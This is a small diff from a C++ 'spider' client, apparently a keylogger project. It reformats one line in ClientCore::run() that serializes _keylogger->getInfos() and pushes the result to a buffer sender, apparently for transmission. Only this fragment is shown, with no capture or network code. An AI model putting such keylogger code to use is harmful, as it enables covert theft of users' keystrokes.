@@ -44,8 +44,7 @@ void spider::ClientCore::run()
   {
     thread.get()->createThread(_proto);
   }
-  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
-  while (running)
+  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));  while (running)
   {
     if (!GetMessage(&msg, nullptr, 0, 0))
     {
